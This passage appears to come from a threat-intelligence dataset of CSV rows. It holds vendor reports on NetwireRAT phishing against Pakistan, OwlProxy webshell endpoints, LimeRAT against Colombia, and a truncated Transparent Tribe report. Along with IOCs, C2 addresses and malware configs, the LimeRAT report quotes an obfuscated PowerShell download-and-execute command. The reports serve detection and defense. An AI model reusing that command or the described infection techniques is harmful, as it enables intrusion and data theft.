Netwire has recently been employed with new anti-analysis techniques in order to hinder its reversal. Earlier versions involved WinApi usage for anti-analysis tricks like using **GetCursorPos(), ZwGetContextThread()** to check mouse position and to check register status for breakpoints respectively. The below screenshot shows the usage of GetCursorPos() api as anti-trick in an older version. ![Anti-Analysis technique used in older version](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Anti-Analysis%20technique%20used%20in%20older%20version.png) *Figure 10: Anti-Analysis technique used in older version of NetWire* In addition to this, the old NetWire malware also checked the registers status against soft breakpoints, as we can see in the above image. For example, the call 'eax' is the call to the API. If we put a breakpoint on that in the debugger, the byte is replaced with 0xCC. That value is checked by NetWire using ZwGetThreadContext() api as an anti-trick. **MD5 Hash: 60D234D54C25DCEF19A64DED3A587072** During our analysis, we found that the malware extracts malicious code into the memory and executes it to evade antivirus detection. During static analysis, we have found that the malware is using some important libraries such as WS2\_32 library to perform network activity. ![Import libraries of the malware](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/import.PNG) *Figure 11: Import libraries of the malware* Debugging the malicious code, we have seen that the malware author has also employed string obfuscation as an anti-analysis trick as shown in figure:12. ![Obfuscated String](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Obfuscated%20String.PNG) *Figure 12: Obfuscated String* Following decryption, we get the following API: “***winHttpGetIEProxyConfigForCurrentUser***” This piece of code has a self-decryption routine where it allocates a new memory space and then decrypts the code. ![Self-Decryption Routine](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Self%20decrypting%20routine.PNG) *Figure 13: Self-Decryption Routine* **Persistence** After decryption, the malware assigns HostId randomly and adds it as a registry key. ![Random HostID](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Host-ID.PNG) *Figure 14: Random HostID* **key: HKEY\_CURRENT\_USER\Software\NETwIRe name: HostId** **key: HKEY\_CURRENT\_USER\Software\NETwIRe name: Install Date** **key: HKEY\_CURRENT\_USER\Software\Microsoft\Windows\CurrentVersion\Run name: sysWOW32** ![Registry key for persistence](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Host%20ID%20and%20install%20date%20in%20registry.PNG) *Figure 15: Registry key for persistence.* **Stealing functionality** This malware basically steals sensitive information from the victim's machine. ![Stealing information](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Stealing%20data.PNG) *Figure 16: Stealing information* A sample of keystrokes logs in a file that is created in the %AppData% directory, which the malware stores in obfuscated form. ![Keylogs in obfuscated form](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/log.png) *Figure 17: Keylogs in obfuscated form* **Command and Control** Another thing related to network activity we observed in the new variant was that this new Netwire variant uses **WinHttpGetIEProxyConfigForCurrentUser()** api ,which retrieves the Internet Explorer proxy configuration for the current user in the system (adversaries use this feature as a network relay between the malware and the proxy server by listening over a certain port). This api retrieves the list of proxy servers in the system. It steals users' sensitive information and browser history stored in the browsers and sends it to the command and control server. During our analysis of the binary structure, we found the hardcoded IP address of the Command and Control server: 66[.]42.43.177. ![Data to be sent using proxy](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Data%20to%20be%20sent%20using%20proxy.png) *Figure 18: Data to be sent using proxy* ThreatLabz observed that NetwireRAT malware sends the collected victim’s data using the proxy server in obfuscated form using the same api (which was decrypted above). This way of sending victims' data using a proxy server is a new feature being implemented in the updated version of NetWireRAT. **Config extracted from malware** { *""C2 list"": [ ""127.0.0.1:3360"", ""66.42.43.177:443"" ], ""Password"": ""Password"", ""Host ID"": ""HostId-%Rand%"", ""Mutex"": ""-"", ""Install Path"": ""C:\\Windows\\System32\\spool\\drivers\\color"", ""Startup Name"": ""sysWOW32"", ""ActiveX Key"": ""-"", ""KeyLog Directory"": ""-""* } **Cloud Sandbox Detection** Zscaler Cloud Sandbox successfully detects the malicious documents as well as the payload. ![Zscaler Cloud Sandbox detection](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Sandbox%20report%20of%20payload.PNG) *Figure 19: Zscaler Cloud Sandbox detection* In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels [VBA.Downloader.NetwiredRC](https://threatlibrary.zscaler.com/?keyword=VBA.Downloader.NetwiredRC) [Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.NetwiredRC) **Conclusion** Over the years, cyber criminals have adopted multiple ways to infect their victims with NetwiredRC and achieved lots of success. We are not conclusively attributing this attack to any particular group with high confidence, but similar techniques and NetwireRAT payloads have been utilized by state sponsored groups such as APT33 and Gorgon. Attackers continuously embrace new anti-analysis tricks to evade security solutions; re-packaging of malware makes static analysis even more challenging. The Zscaler ThreatLabz team will continue to monitor this attack, as well as others, to help keep our customers safe. **MITRE ATT&CK TTP Mapping** | Tactic | Technique | | T1547 | Boot Logon or AutoStart Execution | | T1056 | Input Capture | | T1036 | Masquerading | | T1113 | Screen Capture | | T1082 | System Information Discovery | | T1055 | Process Hollowing | | T1555 | Credentials From Web Browsers | | T1074 | Data Staged: Local Data Staging | **Indicators of Compromise (IOC’s)** **Doc files** 22DF783F7881A7F6973028E21CA19D4F AB5DAC030DC5FC9ED802C0322168558B B6EC09770ED5B34922B0CF56CB17BC95 **Payload** 60D234D54C25DCEF19A64DED3A587072 715788FB520B3873DB406FDF59521AFA 026C1CE7E96A898C23A7CE9A567B9568 617E8CC54BB247091266826225553A25 **CnC** 66[.]42.43.177:443"
annoctr,annoctr/AnnoCTR/text/dev/zscaler_2021-07-14_targeted-attack-government-organizations-delivers.txt,zscaler_2021-07-14_targeted-attack-government-organizations-delivers,G0078,"Targeted Attack on Government Organizations Delivers Netwire RAT July 14, 2021 The Zscaler ThreatLabz team has observed an interesting spear phishing campaign beginning July 2021 in which a threat actor is targeting a wide range of organizations in Pakistan. NetwiredRC is being used as the final payload in this attack campaign. The combination of spear phishing and the use of information stealing RAT indicates that this is not a simple cyber crime, but a larger cyberattack campaign targeting multiple government organizations in Pakistan along with other industry verticals. **Attack Cycle** ![Attack chain infographic](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Attack%20chain%20infographic.png) *Figure 1: Attack chain* **Key features of this attack** 1.The attack has targeted multiple Pakistani government organizations using spear phishing emails. 2.Lures use email info stolen from the actual website of the Pakistan government (*Ministry of Information technology and telecommunication*). 3.The attack downloads its payload from the compromised website of the National College of Nepal located in Kathmandu. 4.NetwireRAT, a well-known malware for stealing sensitive information, is being used as the final payload in the attack. 5.Stolen information is sent using a proxy server in obfuscated form using the api *WinHttpGetIEProxyConfigForCurrentUser()* to command and control server 66[.]42.43.177:443 One of the latest spearphishing emails was sent from a spoofed email ID <[[email protected]](/cdn-cgi/l/email-protection)> masquerading as “National Cyber Security Policy Feedback,” impersonating a government account which may be known by the target. During analysis, we found that the originating IP of the email is 209[.]58.188.82 which belongs to Hong Kong and has been [reported](https://www.abuseipdb.com/check/209.58.188.82) for multiple phishing attacks in the past. ![Spoofed email from <feedback.ncsp@moitt.gov.pk>](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/email.PNG) *Figure 2: Spoofed email from <[[email protected]](/cdn-cgi/l/email-protection#3a5c5f5f5e585b5951145459494a7a5755534e4e145d554c144a51)>* The email was sent on Wednesday, June 30, 2021 10:44 AM (PKT) with the subject “Cyber Security Policy Consultation Draft Final Update” to lure the recipients into opening an attached file named “NSCP-DRAFT-Final.docm”. The mail body contained information on the latest updates of the National Cyber Security Policy Draft along with the signature of a senior official to make the email look more professional and genuine. Upon further research, it seems that the email info has been copied from the Ministry of Information Technology & Telecommunication site. ![Email info from MoITT site.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/moiTT.jpg) *Figure 3: Email info from MoITT site.* Digging into the message source of the email, we can see that the spearphishing email is targeting users from a number of different industry verticals. ![Recipients email id from Message Source](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/users%20recieved%20email.PNG) *Figure 4: Originating IP and recipient email IDs from Message Source* Looking at the Email ID of multiple users, we can see that multiple sectors are being targeted by the threat actor, including Energy, Agricultural, Chemicals, Educational, Telecommunication and Financial Sectors, among others. **Distribution Strategy** We have observed multiple documents being delivered in various spearphishing attacks. All the documents have exactly the same macro content with the same URL to download the final payload. 1.The first document we analyzed has a macro code containing a PowerShell script to download the final payload and execute it. **MD5 Hash: 22DF783F7881A7F6973028E21CA19D4F File Name: NSCP-DRAFT-Final.docm** ![Attached Docm file prompts to enable Macro.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/1st%20Docm%20file%20asking%20to%20enable%20macro.PNG) *Figure 5: Attached .Docm file prompts the user to enable macros* 2.The second document we analyzed has a different title and slightly different text, but is otherwise extremely similar to the first document, and also has a macro code containing a PowerShell script to download the final payload and execute it. **MD5 Hash: AB5DAC030DC5FC9ED802C0322168558B File Name: SCO-Cyber-Advisory.docm** ![Another docm file having malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/2nd%20Docm%20file%20asking%20to%20enable%20macro.PNG) *Figure 6: Another malicious .docm file* 3.The third document we analyzed is also very similar to the first two instances. It contains a macro code containing a PowerShell script to download the final payload and execute it. The content displayed in this document masquerades as a lab handbook related to Institute of Space Technology (IST), Islamabad. **MD5 Hash: B6EC09770ED5B34922B0CF56CB17BC95 File Name: Press Note July-SCO.docm** ![Another similar docm having malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/3rd%20Docm%20file%20asking%20to%20enable%20macro.PNG) *Figure 7: Another similar .docm with a malicious macro* **Technical Analysis of the macro** Once the document is opened, attackers try to trick the user by prompting them to enable macros to read the complete document. Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro with base-64 encoded URL. The macro downloads the final payload and path to save and execute the payload with the help of a PowerShell command. ![Macro code having based 64 encoded URL](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/1st%20macro%20code.PNG) *Figure 8: Macro code with base 64 encoded URL* The two functions performed by the macro code are: a.Download the payload from the given URL in the macro code. b.Save and execute the payload from the specified path in the macro code. Upon decryption, we get the URL which seems to be a recently compromised website belonging to the National College of Nepal located in Kathmandu. “***hxxps://nationalcollege.edu[.]np/admin/assets/js/jquery/tiny/plugins/anchor/.anchor/sysWow64.exe***” ![Decrypted Macro code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/1st%20decrypted%20macro.PNG) *Figure 9: Decrypted Macro code* File Path: <*C:\Windows\System32\spool\drivers\color\sysWow64.exe*> **Technical Analysis of the payload** Once PowerShell downloads the final payload (NetwiredRC), it copies itself to the above mentioned path from where it gets executed. NetwireRAT is not a new malware/RAT on the surface. First seen in 2012, it attempts to steal victims' passwords, including login credentials, FTP credentials, credit card data etc. It claims to be available in all OS formats including MacOS, Android and Windows. NetWireRAT is believed to have been used by the Iranian Nation state sponsored group APT33/Elfin back in 2016. Once executed on the victim’s machine, several anti-analysis techniques are used to protect it from analysis. This version of Netwire has recently been employed with new anti-analysis techniques in order to hinder its reversal. Earlier versions involved WinApi usage for anti-analysis tricks like using **GetCursorPos(), ZwGetContextThread()** to check mouse position and to check register status for breakpoints respectively. The below screenshot shows the usage of GetCursorPos() api as anti-trick in an older version. ![Anti-Analysis technique used in older version](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Anti-Analysis%20technique%20used%20in%20older%20version.png) *Figure 10: Anti-Analysis technique used in older version of NetWire* In addition to this, the old NetWire malware also checked the registers status against soft breakpoints, as we can see in the above image. For example, the call 'eax' is the call to the API. If we put a breakpoint on that in the debugger, the byte is replaced with 0xCC. That value is checked by NetWire using ZwGetThreadContext() api as an anti-trick. **MD5 Hash: 60D234D54C25DCEF19A64DED3A587072** During our analysis, we found that the malware extracts malicious code into the memory and executes it to evade antivirus detection. During static analysis, we have found that the malware is using some important libraries such as WS2\_32 library to perform network activity. ![Import libraries of the malware](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/import.PNG) *Figure 11: Import libraries of the malware* Debugging the malicious code, we have seen that the malware author has also employed string obfuscation as an anti-analysis trick as shown in figure:12. ![Obfuscated String](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Obfuscated%20String.PNG) *Figure 12: Obfuscated String* Following decryption, we get the following API: “***winHttpGetIEProxyConfigForCurrentUser***” This piece of code has a self-decryption routine where it allocates a new memory space and then decrypts the code. ![Self-Decryption Routine](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Self%20decrypting%20routine.PNG) *Figure 13: Self-Decryption Routine* **Persistence** After decryption, the malware assigns HostId randomly and adds it as a registry key. ![Random HostID](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Host-ID.PNG) *Figure 14: Random HostID* **key: HKEY\_CURRENT\_USER\Software\NETwIRe name: HostId** **key: HKEY\_CURRENT\_USER\Software\NETwIRe name: Install Date** **key: HKEY\_CURRENT\_USER\Software\Microsoft\Windows\CurrentVersion\Run name: sysWOW32** ![Registry key for persistence](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Host%20ID%20and%20install%20date%20in%20registry.PNG) *Figure 15: Registry key for persistence.* **Stealing functionality** This malware basically steals sensitive information from the victim's machine. ![Stealing information](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Stealing%20data.PNG) *Figure 16: Stealing information* A sample of keystrokes logs in a file that is created in the %AppData% directory, which the malware stores in obfuscated form. ![Keylogs in obfuscated form](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/log.png) *Figure 17: Keylogs in obfuscated form* **Command and Control** Another thing related to network activity we observed in the new variant was that this new Netwire variant uses **WinHttpGetIEProxyConfigForCurrentUser()** api ,which retrieves the Internet Explorer proxy configuration for the current user in the system (adversaries use this feature as a network relay between the malware and the proxy server by listening over a certain port). This api retrieves the list of proxy servers in the system. It steals users' sensitive information and browser history stored in the browsers and sends it to the command and control server. During our analysis of the binary structure, we found the hardcoded IP address of the Command and Control server: 66[.]42.43.177. ![Data to be sent using proxy](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Data%20to%20be%20sent%20using%20proxy.png) *Figure 18: Data to be sent using proxy* ThreatLabz observed that NetwireRAT malware sends the collected victim’s data using the proxy server in obfuscated form using the same api (which was decrypted above). This way of sending victims' data using a proxy server is a new feature being implemented in the updated version of NetWireRAT. **Config extracted from malware** { *""C2 list"": [ ""127.0.0.1:3360"", ""66.42.43.177:443"" ], ""Password"": ""Password"", ""Host ID"": ""HostId-%Rand%"", ""Mutex"": ""-"", ""Install Path"": ""C:\\Windows\\System32\\spool\\drivers\\color"", ""Startup Name"": ""sysWOW32"", ""ActiveX Key"": ""-"", ""KeyLog Directory"": ""-""* } **Cloud Sandbox Detection** Zscaler Cloud Sandbox successfully detects the malicious documents as well as the payload. ![Zscaler Cloud Sandbox detection](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Sandbox%20report%20of%20payload.PNG) *Figure 19: Zscaler Cloud Sandbox detection* In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels [VBA.Downloader.NetwiredRC](https://threatlibrary.zscaler.com/?keyword=VBA.Downloader.NetwiredRC) [Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.NetwiredRC) **Conclusion** Over the years, cyber criminals have adopted multiple ways to infect their victims with NetwiredRC and achieved lots of success. We are not conclusively attributing this attack to any particular group with high confidence, but similar techniques and NetwireRAT payloads have been utilized by state sponsored groups such as APT33 and Gorgon. Attackers continuously embrace new anti-analysis tricks to evade security solutions; re-packaging of malware makes static analysis even more challenging. The Zscaler ThreatLabz team will continue to monitor this attack, as well as others, to help keep our customers safe. **MITRE ATT&CK TTP Mapping** | Tactic | Technique | | T1547 | Boot Logon or AutoStart Execution | | T1056 | Input Capture | | T1036 | Masquerading | | T1113 | Screen Capture | | T1082 | System Information Discovery | | T1055 | Process Hollowing | | T1555 | Credentials From Web Browsers | | T1074 | Data Staged: Local Data Staging | **Indicators of Compromise (IOC’s)** **Doc files** 22DF783F7881A7F6973028E21CA19D4F AB5DAC030DC5FC9ED802C0322168558B B6EC09770ED5B34922B0CF56CB17BC95 **Payload** 60D234D54C25DCEF19A64DED3A587072 715788FB520B3873DB406FDF59521AFA 026C1CE7E96A898C23A7CE9A567B9568 617E8CC54BB247091266826225553A25 **CnC** 66[.]42.43.177:443"
annoctr,annoctr/AnnoCTR/text/test/lab52_2021-04-29_chimera-apt-updates-on-its.txt,lab52_2021-04-29_chimera-apt-updates-on-its,G0114,"Updates on OwlProxy malware April 29, 2021 During the analysis of some malicious artifacts collected from an incident, we have recently detected a sample that has caught our attention, the sample was deployed on a server exposed to the Internet and was packed with “VMProtect”. After analyzing this malware sample we could see that it was a recent version of a tool known as OwlProxy, which has been detected on targets hit by the APT group known as Chimera. The use of “VMProtect” by the actors makes the analysis of their code more time-consuming (although it simplifies its detection since this is already an anomaly by itself). On the other hand, this packer has some weaknesses such as the fact that it does not always protect part of the binary metadata and that once in memory, it does not obfuscate most of the strings, which makes these elements of the executable relatively easy to analyze once in memory. Especially for this sample it helps for its identification given the amount of quite unique strings it contains. An example of this is the fact that in static you can see how it still contains the string with the original name of the binary (iisdll.dll). From some of these strings, it can be seen how new samples are being uploaded regularly, which after a more detailed analysis have been identified as different 32-bit and 64-bit versions of the same threat, some of them packaged and others not. ![](https://lab52.io/blog/wp-content/uploads/2021/04/asd2-1024x308.png) ![](https://lab52.io/blog/wp-content/uploads/2021/04/asd3.png) Some of them, dating from 2019, largely coincide with the samples analyzed in the following [CyCraft](https://cybernews.com/security/taiwan-government-targeted-by-multiple-cyberattacks-owlproxy-malware/) A summary of its capabilities can be found in this report, which explains that it acts as a proxy between the DMZ of the victim’s infrastructure and its internal network and also allows the execution of commands remotely. The report shows the metadata of the binary where you can see how the PDB matches with most of the more recent samples that can be found in Virustotal. ![](https://lab52.io/blog/wp-content/uploads/2021/04/asd4.png) It is also explained in the report that the sample puts its persistence as a Service and highlights the two endpoints it exposes while it is running. In the case of the samples analyzed, instead of using port 80, they are exposing the port 443 using SSL and they have stopped using the string “servlet” and now they have different strings depending on the sample in question, they have kept the string “pp” for the endpoint that acts as proxy. Two samples from 02/2019 DEE3A502AEDCBE109373AA200A690D4E2D1A10FA3CF69A7B6DB68A78C6ABFC2C | https://+:443/HelpTheme/ | Remote CMD addr | | https://+:443/HelpTheme/pp/ | Proxy addr | | FastUserSwitchingCompatibility | Service Name | 75E616BF87AD0CBE738C4C48BC0ECD114871DEF145E21545FA11705D3A11D60E | https://+:443/topics/ | Remote CMD addr | | https://+:443/topics/pp/ | Proxy addr | | wmipd | Service Name | Along with these two samples, there are 3 more recent ones (July 2020). Two of them are newer versions of this same 32-bit and 64-bit tool and the third one is an installer or dropper (9A9FFDB8FC20B6E6E6E5A1DE434F6B834E69755FD62157F91884E9A681F0073256) that when executed, depending on the operating system architecture, extracts from its resources a suitable OwlProxy sample for the architecture in question, installs it in system32 with the name “wmipd.dll”, gives it the same creation and modification date as “calc.exe” and creates a service named wmipd that runs it at every system startup. The pdb of this dropper keeps the string “owl” in its path, so we have named it OwlInstaller. “f:\project\owl\isapi\win32\release\iisinstaller.pdb”. The OwlProxy sample of its resources is split into reverse ordered blocks, so the MZ header, for example, is in the last 2634 bytes of the file. Once extracted and installed, these more recent samples have many strings and use OutputDebugString in several occasions, which causes that in debugging or using DebugView a few of this strings can be seen as debug information: ![](https://lab52.io/blog/wp-content/uploads/2021/04/asd5.png) Along with the fact that these also use “https” as protocol, and that they have again changed part of the path of their endpoints to use “exchangetopicservices” (probable evolution of the 2019 samples that use the string “topics”), they have added a new endpoint to the tool, as follows: | https://+:443/exchangetopicservices/ | Remote CMD addr | | https://+:443/exchangetopicservices/pp/ | Proxy | | https://+:443/exchangetopicservices/px/ | Webshell | The path ending in “exchangetopicservices” still works the same way as in previous samples, executing commands in a cmd process through unnamed pipes. The proxy endpoint has also remained the same in terms of capabilities. Finally, thanks to all the strings in the binary, it is easy to spot that they call this endpoint “Webshell\_run”, whose URI ends in “/px/”, and consists of a function that adds the following list of commands: * get\_driver * get\_directory * upload\_file * do***nw***load\_file This area has many more strings than the rest, and it is curious that several of them are misspelled. In fact the first error probably comes in the command “get\_driver” since in its internal logic the only thing it does is to list the hard disks installed in the computer: ![](https://lab52.io/blog/wp-content/uploads/2021/04/asd6-1.png) Which suggests that probably, this functionality should be called “get\_drives” :\_) The next wrong command is “do**nw**load\_file”, although in this case it’s easy to guess what it means and it does exactly that, it allows the attacker to download a file from the compromised server. ![](https://lab52.io/blog/wp-content/uploads/2021/04/asd7.png) The rest do match their names since “get\_directory” can be used to list the contents of a directory and “upload\_file” is used to drop a file on the remote server. The last notable error we have detected is a translation error when a file does not exist in the “get\_directory” command. ![](https://lab52.io/blog/wp-content/uploads/2021/04/asd8-1.png) The older versions have much fewer strings, so it is likely that in future versions of the threat will remove many of those described in this post, but some of them are used to identify the command executed, so it is possible that they will remain, along with the pdb that they have been leaving since 2019. What is clear is that they are in constant development. | DEE3A502AEDCBE109373AA200A690D4E2D1A10FA3CF69A7B6DB68A78C6ABFC2C | Old OwlProxy x64 version | | 75E616BF87AD0CBE738C4C48BC0ECD114871DEF145E21545FA11705D3A11D60E | Old OwlProxy x64 version | | 16CF6924ECA8208AD9D9B8470CF0A849995ED4D981D5BC706E62AE878EF261BB | Recent OwlProxy x86 version | | C9B8CFACC859E494984AE9DDF864314AF651FD32E60F33C7F42BFC640620E8CA | Recent OwlProxy x64 version | | 95E7E09468F7DC62DA42E036B6E36CE27DC04C2CA0BB86A2FED39B3CC2BF4A97 | VMProtect OwlProxy x64 version | | 9A9FFDB8FC20B6E6E5A1DE434F6B834E69755FD62157F91884E9A681F0073256 | OwlInstaller |"
annoctr,annoctr/AnnoCTR/text/test/lab52_2021-05-17_literature-lover-targeting-colombia-with.txt,lab52_2021-05-17_literature-lover-targeting-colombia-with,G0099,"Literature lover targeting Colombia with LimeRAT May 17, 2021 In the middle of the current brouhaha in Colombia, besides the intense hacktivism activity, some actors might be trying to take their move. Several campaigns aimed to Colombia have been detected, but today we will talk about one with a couple interesting details in their kill chain. This actor is starting the infection via email with very generic topics such as subpoenas or bank payments, with a crafted html view where the icon pretending to be an attachment is in fact an image with a link to download a compressed file from One Drive. ![](https://lab52.io/blog/wp-content/uploads/2021/05/phichin-1024x506.png)Phishing emails serving same malicious sample The .rar file contains a Visual Basic Script with same name “citacion juzgado.vbs” which, poorly obfuscated, will create a Windows Script Host Shell Object to download and execute a new Powershell script by executing the following command: “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe” I`E`X((n`e`W`-Obj`E`c`T((‘Net.Webclient’))).((‘Downloadstri’+’ng’)).InVokE(((‘https://ia601509.us.archive.org/20/items/3\_20210512\_20210512\_1430/3.txt’)))) The interesting fact about this first stage is that this element is being downloaded from The Internet Archive, where you can take snapshots of websites, or upload “antique” files, so they keep being accessible after the website disappears from the ordinary internet at their original hosting site. We are starting to witness how attackers are using legitimate domains such as discord or twitter, to download some malicious payload, or even legitimate cloud services such as One Drive or DropBox to host different samples. However, using The Internet Archive could be considered witty, and not-so-much seen in the wild so far. ![](https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-13-16-46-32-1.png) *Opendir in The Internet Archive* Basically, this Powershell script will download a series of other different scripts which will be dropped in “C:\Users\Public\” and “C:\ProgramData\Microsoft Arts\Start\”, and establish persistence using the Registry Key “HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders”. ![](https://lab52.io/blog/wp-content/uploads/2021/05/chain-1-1024x629.png) Infection Chain Among these different scripts, most of them trying to disable typical AntiVirus solutions, there is one implementing a technique a little more advanced than the rest of the techniques, known as Reflection Assembly, and consisting of the creation of binary payloads as byte arrays in Powershell and then loading them using a puppet process injection within the memory of process “C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe” as shown in the following screenshot, or in “C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe”, depending on the results of some previous checks. ![](https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-14-09-39-46-1024x60.png)Reflected Assembly Process injection After dumping this binary content into respective files, we could identify two Dynamic Libraries written in .NET, one of them used as a loader for the other, which happens to be the final malicious Remote Access Trojan (RAT). According to [360 Total Security researchers](https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/), some similar techniques were spotted loading a Delphi version of the njRAT in July 2020, by what it seemed to be an Arabic speaker actor. Even though in both cases the binary files have resulted in Dynamic Libraries and same loading technique, in this occasion both binaries were identified as written in .NET. Furthermore, the RAT used in this scenario was Lime-RAT, a modified version of njRAT. When taking a closer look at the final stage in order to identify the final Command and Control server, we found another interesting element. This actor chose the domain “santiagonasar.]duckdns.org”, which is actually the name of the main character of Chronicle of a Death Foretold (Crónica de una muerte anunciada), a great novel written by Gabriel García Márquez, Colombian writer. But the passion for literature of our friends was not only reflected in the domain name, but also in the chosen port: 1984. Although the aforementioned book was published in 1983, our first impression was to think of this name as a reference to the novel written by George Orwell, named “1984”. Despite having seen the string “ALOSH” repetitively through the different stages, suggesting that this could be an individual going by this nickname, it is worth mentioning the fact that the APT group referred as APT-C-36, or Blind Eagle, have been spotted many times using this same toolset including LimeRAT, targeting same geographic area through phishing emails written in perfect Spanish, and also using Duckdns as part of their infrastructure. After a quick research on previous DNS resolutions of the final C2, we could identify related documents contacting the same IP, referring to Colombia and the use of the word “Cacha”, which could be a way of saying “friend” or “brother” in Colombia, among other meanings in Spanish. These relations, added to the Spanish literary culture, would clearly indicate a focus in Colombia. ![](https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-14-16-18-35.png) Previous domains resolving to same IP ![](https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-14-16-32-41-1024x106.png) Different execution parents Lastly, after another quick search on different binary executables contacting this same C2, we found different forms of packed malware samples using strings in Asian and Cyrillic encoding, with a noisier obfuscation. About these samples, we noticed that the attacker could have been only rotating the contacted port (4433, 1986, 2000) which could be enough to mislead an automated sandbox identifying the host as dead. The cached analysis in shodan.io would also show that the server might only have one port open at a time, which would support the idea of the attacker rotating ports for every campaign while reusing same C2 infrastructure. ![](https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-17-12-47-44.png) C2 check in shodan.io IOCs | 0d7abdd154b96c36680719ef15d81c64a0a12276a5d1ec8d9ec0bffd45545d6 | | | ff525bc3aade928db718dab395eeba0f886054c889dda2389a51628d58924ff5 | | | 0a9a1e043d8138bb8fb257f07ac80c0fb8287eec1c131efff3a4302b13ec78c3 | | | https://onedrive.live.]com/download?cid=A4F059D1DE692167&resid=A4F059D1DE692167%21107&authkey=AOG1a9Z-hUIFbhI | | | https://nyc008.hawkhost.]com/~invoixec/ | | | https://ia601509.us.archive.]org/20/items/3\_20210512\_20210512\_1430/3.txt | | | https://ia601509.us.archive.]org/28/items/1\_20210512\_20210512\_1427/1.txt | | | santiagonasar.]duckdns.org | | | santiagonasar2.]duckdns.org | | | cachanuevo.]duckdns.org | | | 2021cacha.]duckdns.org | | | enviocacha.]duckdns.org | | | sosht.]duckdns.org | | | 172.96.187.2 | | | 181.141.0.30 | | References <https://twitter.com/1ZRR4H/status/1392789216141004802> <https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/>"
annoctr,annoctr/AnnoCTR/text/test/lab52_2022-01-24_new-transparentribe-operation-targeting-india.txt,lab52_2022-01-24_new-transparentribe-operation-targeting-india,G0134,"New TransparenTribe Operation: Targeting India with weaponized COVID-19 lure documents January 24, 2022 Over the last months, lab52 has been researching an attack campaign which targets government and military personnel of India. In fact, targeting the Indian government seems to be one of the key indicators of the group that may be behind this attack. Furthermore, some of the artifacts and infrastructure used to carry out the novel infection campaign are strongly related to the threat group Transparent Tribe. Initially, Lab52 detected a suspicious IMG file (Covid\_Letter.img – 948dffef9a11c11a6d81905e59ca1882) that was uploaded in VirusTotal via the web site from India, with upload date 09-06-2021. This file may have been sent attached to an email and contains a PDF document and some artifacts in order to display a decoy PDF to the user and initiate the infection process in the background. The PDF is named Vaccination06042021.pdf and its contents are related to COVID vaccination for employees over 45 years of age at the Central Administration of the Government of India. ![](https://lab52.io/blog/wp-content/uploads/2022/01/1-2-810x1024.png) Although this decoy PDF document is harmless, the IMG file contains some other artifacts that will carry out the infection. Firstly, the IMG file contains a shortcut with the same name as the PDF document, which will be in charge of starting the infection by launching a Visual Basic script called doc.vbs. The infection chain continues executing both the decoy PDF document and a Windows PE (ServiceHub.MsDetouredHost.exe – 68d73d596a7103e517967f7f4e22cecb) which after being analyzed, we have been able to identify it as a Python/PeppyRAT. ![](https://lab52.io/blog/wp-content/uploads/2022/01/2v2-2-1024x843.jpg) The main feature of this Windows executable is the ability to run embedded Python commands from itself. For this, the threat firstly relaunches itself and then starts building a new IAT (*Import Address Table*) referencing a large number of Python functions contained in the Python27.dll library that will be executed later. ![](https://lab52.io/blog/wp-content/uploads/2022/01/3-2-1024x413.png) ![](https://lab52.io/blog/wp-content/uploads/2022/01/4-1-1024x604.png) The crux of the matter is that by dropping all python compiled objects and dynamic-link libraries required into %TEMP% directory, it makes this python command execution technique possible through a Windows PE file. ![](https://lab52.io/blog/wp-content/uploads/2022/01/5-2.png) An example of python command execution though a Windows PE can be seen below: ![](https://lab52.io/blog/wp-content/uploads/2022/01/6-2.png) Once the threat gets its environment all set, it builds and loads into memory a Python script that will be in charge of obtaining 